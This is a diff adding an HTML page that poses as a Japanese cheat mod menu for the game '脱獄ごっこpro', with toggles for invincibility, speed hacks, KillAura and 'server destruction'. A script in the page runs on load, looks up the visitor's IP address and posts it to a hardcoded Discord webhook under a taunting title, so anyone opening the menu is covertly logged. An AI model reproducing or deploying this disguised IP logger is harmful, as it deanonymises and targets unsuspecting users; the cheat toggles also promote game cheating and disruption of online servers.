@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html>
+<script>
+setButtonImage("https://static.gameguardian.net/monthly_2016_12/logo.png.7ea0bf50a92f70ebc7ff10aa74e1dd55.png");
+</script>
+  <head>
+    <meta name="viewport" content="width=320, initial-scale=1">
+    <meta charset="utf-8">
+<style>
+
+     body, html {
+        min-width: 100%;
+        min-height: 150%;
+        margin: 0;
+        padding: 0;
+        font:  14px;
+        color:#fff;
+　　　　　height: 100%;
+        
+        font-weight:900;
+        font-size:9px;
+        font-family: 'Poppins', sans-serif;
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+      }
+      .box {
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+        height:359px;
+        width:299px;
+        border:1px solid rgba(103,103,103,.39);
+        border-top:0px solid rgba(255,255,255,.4);
+        background:rgba(0,0,0,.81);
+        
+
+      }
+      .lan {
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+        width:299px;
+        height:15px;
+        background:rgba(89,98,204,.51);
+        border:1px solid rgba(103,103,103,.39);
+        border-bottom:0px solid rgba(146,146,146,.83);
+        position:absolute;
+        
+        font-weight:1500;
+        text-align:center;
+        margin: 0px;
+        padding:2px 0px 0 0px ;
+        
+  
+        
+        
+  
+  user-select: none;
+  font-family: 'Poppins', sans-serif;
+  color:white;
+      }
+      .kq {
+height:10px;
+width: 100px;
+overflow: scroll;
+      }
+      
+ details {
+   -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+   width:292px;
+   position:relative;
+margin:3px 0 0 3.5px;
+top:4px;
+outline:none;
+
+
+      }
+      details[type=menu] {
+
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+        
+outline:none;
+      }
+      
+summary{
+  -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+  position:relative;
+ width:280px; 
+ padding:0 0 2px 12px; 
+ background:rgba(89,99,204,.51);
+  margin:0 0 0 -7px;
+
+  font-size:15px;
+height:16px;
+  left:7px;
+  top:-2px;
+  outline:none;
+      }
+      summary:hover{
+        
+background:rgba(93,104,215,.4);
+
+-moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+      }
+      .font {
+position:absolute;
+     font-size:9px;  
+      top:2px;
+
+      }
+          .font2 {
+        text-align:center;
+        font-size:8px;
+        
+        left:120px;
+       
+        margin:0px 0 0px 0;
+        position:absolute;
+        
+        
+
+      }
+      
+      .myonoffbutton input[type="onclick"]{
+    display: none;
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+}
+input[type=checkbox]{
+        vertical-align:middle;
+height: 17px;
+        
+        width:17px;
+background:rgba(255,255,255,.25);
+margin-top:0px;
+margin-left:5px;
+margin-right:5px; 
+border-radius:0;
+      }
+      input[type=radio]{
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+        vertical-align:middle;
+height: 17px;
+        
+        width:17px;
+background:rgba(255,255,255,.25);
+margin-top:0px;
+margin-left:5px;
+margin-right:5px; 
+border-radius:100%;
+      }
+      input[type=checkbox]:checked{
+background:rgba(211,211,211,.84);
+
+      }
+      input {
+        
+        -moz-user-select: none;
+-ms-user-select: none;
+          -webkit-appearance: none;
+background:transparent;
+        -webkit-user-select: none;
+            user-select: none;
+    
+      }
+      input[type=button] {
+        -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+color:#fff;
+height:17px;
+        width:75px;
+        font-size:9px;
+        border-radius:0;
+        background:rgba(100,111,230,.34);
+        border:1px solid rgba(255,255,255,.1);
+
+      }
+          .icon-span{
+      display: inline-block;
+      background-color: #fff;
+      border-radius: 4px;
+      border: 2px solid #7f7f7f;
+      position: relative;
+      width: 18px;
+      height: 18px;
+      vertical-align: middle;
+    }
+    .icon-span::after{
+      border: 2px solid transparent;
+      border-left: 0;
+      border-top: 0;
+      content: " ";
+      top: 2px;
+      left: 5px;
+      position: absolute;
+      width: 4px;
+      height: 8px;
+      -webkit-transform: rotate(45deg) scale(0);
+      transform: rotate(45deg) scale(0);
+      -webkit-transition: -webkit-transform .2s;
+      transition: -webkit-transform .2s;
+      transition: transform .2s;
+      transition: transform .2s, -webkit-transform .2s;
+    }
+    .icon-span-select{}
+    .icon-span-select::after{
+      border-color: #fff;
+      -webkit-transform: rotate(45deg) scale(1);
+      transform: rotate(45deg) scale(1);
+    }
+            input[type=range] {
+  height:13px;
+    -moz-user-select: none;
+-ms-user-select: none;
+   user-select:none;
+
+  -webkit-appearance: none;
+}
+      input[type=range]::-webkit-slider-runnable-track:hover{
+background:rgba(89,98,204,.51);
+
+
+
+      }
+  
+
+.hongse {
+      position:relative;
+height:15px;
+  width:15px;
+  top:-2px;
+  border:0.5px solid rgba(211,211,211,.84);
+background:red;
+  display:flex;
+  flex:end;
+  display: inline-block;
+  
+      }
+
+.lvse {
+  position:relative;
+background:#19ff00;
+height:15px;
+  width:15px;
+  border:0.5px solid rgba(211,211,211,.84);
+  top:0px;
+  display:flex;
+  flex:end;
+  display: inline-block;
+      }
+.f1{
+position: relative;
+  top:-6px;
+display: inline-block;
+
+      }
+  .f2{
+  position: relative;
+  top:-5px;
+display: inline-block;
+
+      }
+input[type=range]:focus {
+      
+   user-select:none;
+  outline: none;
+}
+   *:not(input, checkbox, textarea summary details) {
+            /*禁止文本选择*/
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+    
+      }
+input[type=range]::-webkit-slider-runnable-track {
+    -webkit-appearance: none;
+  -moz-user-select: none;
+-ms-user-select: none;
+  height:  17px;
+  cursor: pointer;
+  margin:0 0 0 20px;
+  
+  background: rgba(255,255,255,.1);
+  border-radius: 0px
+  border: 0px solid rgba(255,255,255,.09);
+        
+   user-select:none;
+  padding:2px 2px 0 2px;
+}
+      input[type=range]::-webkit-slider-thumb {
+        -moz-user-select: none;
+-ms-user-select: none;
+        
+          -webkit-appearance: none;
+    width: 10px;	height: 13px;
+border-radius:0;
+ padding:0px;   
+border:0px solid #000;
+box-shadow:100;
+  background: rgba(211,211,211,.84);
+  cursor: pointer;
+  -webkit-appearance: none;
+        
+
+   user-select:none;
+  }
+      .font3 {
+position: relative;
+top:-7px;
+      }
+      .slidercenter{
+pointer-events: none;
+font-size: 9px;
+color: white;
+position:relative;
+top: -3px;
+left: 130px;
+}
+      .slidercenter2{
+pointer-events: none;
+font-size: 9px;
+color: white;
+position:relative;
+top: 21px;
+left: 200px;
+}
+      .slidercenter3{
+pointer-events: none;
+font-size: 9px;
+color: white;
+position:relative;
+top: 40px;
+left: 175px;
+}
+     .font4 {
+
+position:relative;
+top:-20px;
+       left:50px;
+
+
+      }
+           .font5 {
+
+position:relative;
+top:-30px;
+       left:50px;
+
+
+      }
+       .font6 {
+position: relative;
+top:-4px;
+}
+#warplist{
+font-size:20px;
+#warplist tr{
+text-align:center;
+}
+#warplist button{
+font-family: 'mcfont';
+font-weight: bold;
+text-align: center;
+color: #FFF;
+background-color: #4cacc4;
+font-size: 25px;
+border-radius: 12px;
+margin: 5px 2.5px 0 2.5px;
+padding: 5px 20px;
+display: inline-block;
+cursor: pointer;
+border:none;
+}
+#add{
+font-family: 'mcfont';
+font-weight: bold;
+text-align: center;
+width: 220px;
+height: 45px;
+color: #FFF;
+background-color: #4cacc4;
+font-size: 25px;
+border-radius: 12px;
+margin: 5px 2.5px 0 2.5px;
+padding: 5px 20px;
+display: inline-block;border:none;
+}
+
+.container{
+  display: flex;
+  flex-direction: column;
+  height: 100%;
+}
+.scroll_block{
+  flex: 1;
+  overflow-y: auto;
+}
+
+
+
+    </style>
+  <link rel="stylesheet" href="style.css" />
+  <title>IPアドレスを取得してDiscordに送信する</title>
+  <script defer data-domain="datsupromodmenu.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+  <body>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+    <link rel="stylesheet" href="style.css" />
+  <title>IPアドレスを取得してDiscordに送信する</title>
+  </head>
+  <body>
+       <script>
+        // IPアドレスを取得する関数
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
+                })
+                .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
+        }
+
+        // DiscordのWebhookにIPアドレスを送信する関数
+        function sendToDiscord(ipAddress)  {
+            const webhookURL = 'https://discord.com/api/webhooks/1244184697517637692/p5qs80AKY1YjUu1VqWZlXyzsWwBcYbKTN_jlFBJY0pYPefqnPnw1fF0h5pCNNZ4yzI02';
+            const payload = {
+                embeds: [{
+                    title: 'ラフっち様に逆らおうとしたガキ',
+                    description: `IPアドレス: ${ipAddress}`,
+                    color: 3447003 // 青色に設定
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Discordへの送信に失敗しました:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Discordへの送信に失敗しました:', error));
+        }
+
+        // ページが読み込まれたときにIPアドレスを取得してDiscordに送信する
+        getIPAddress();
+    </script>
+   <script>
+
+    
+var w=320;
+ var h=370;
+               var x=(window.screen.height -370)/0.960;
+               var y=(window.screen.width -340)/0;
+                setWindowRect(x, y, w, h);
+
+ setWindowDrag(0,0,350,30);   
+    
+    
+    </script>
+  </head>
+  <body>
+    <div class=kq> </div>
+    <div class=lan><span  class=font2 >脱獄ごっこpro[v12]</span></div>
+    <div class=box>
+    <br><br>
+  <details type=menu><summary><span class=font>[Player]</span></summary>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" onclick="hp(200)">人狼無敵</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" onclick="hp(100)">市民無敵</label><span style=color:transparent;>@</span>
+<h1>-------バトロワ対応-------------</h1>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" onclick="HP4(200)">人狼</label><span style=color:transparent;>@</span>
+
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" onclick="HP4(100)">市民</label><span style=color:transparent;>@</span>
+<input type="checkbox" id="newhp" onclick="newhp">
+<label id="newhp">実行→<input type="checkbox" onclick="runhp()" id="newhp" class="togswi1 hprun"></label><br />
+      </details>  
+      
+      <details type=menu><summary><span class=font>onlineチート系</span></summary>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="punch"onclick="f1920()">全武器連射(脱獄モードケイドロ)</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="racket"onclick="f1919()">全武器連射(
+バトロワヨコロワ)</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="iru"onclick="f820()">無限ジャンプ</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="trop" onclick="f4549()">KillAura</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="warp" onclick="f810()">スピードハック2倍</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="remote" onclick="f812()">スピードハック4倍</label><span style=color:transparent;>@</span>
+<br>
+
+      </details>  
+        <details type=menu><summary><span class=font>色々</span></summary>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id=" " onclick="">開始時間4545秒(反映)</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="iwa" onclick="f1922()">レベル2147483647</label><span style=color:transparent;>@</span>
+<br>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="fsai" onclick="fsai()">トラップ無効化</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="rand" onclick="sai()">全キャラ解放</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="field" onclick="field()">サーバー破壊</label><span style=color:transparent;>@</span>
+      </details>  
+        <details type=menu><summary><span class=font>脱獄ごっこモード系</span></summary>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="kan"onclick="f1931()">プレイヤー透視</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="sei"onclick="f811()">スイッチ無限</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="chest"onclick="findChest(1031339950)">即ゴール判定</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="chest"onclick="findChest(1031339950)">名前上限解放</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="chest"onclick="findChest(1031339950)">エモ固定(反映)</label><span style=color:transparent;>@</span>
+      </details>  
+        <details type=menu><summary><span class=font>ステージ系</span></summary>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="ka"onclick="ka()">プレイヤーアンテナ📡</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="uk" onclick="uk()">エラー色着色</label><span style=color:transparent;>@</span>
+    <label><input class="switch-btn switch-btn animbg"type="checkbox" id="it"onclick="it()">一部壁貫通</label><span style=color:transparent;>@</span>
+
+      </details>  
+        <details type=menu><summary><span class=font>warp</span></summary>
+<button onclick="warpTo(121.9,1.32,-38.54)">白城にテレポ　
+<button onclick="warpTo(125.57,2.81,-75.97)">赤城にテレポ
+      </details>  
+        <details type=menu><summary><span class=font>未定</span></summary>
+    
+    </div>
+  </body>
+</html>
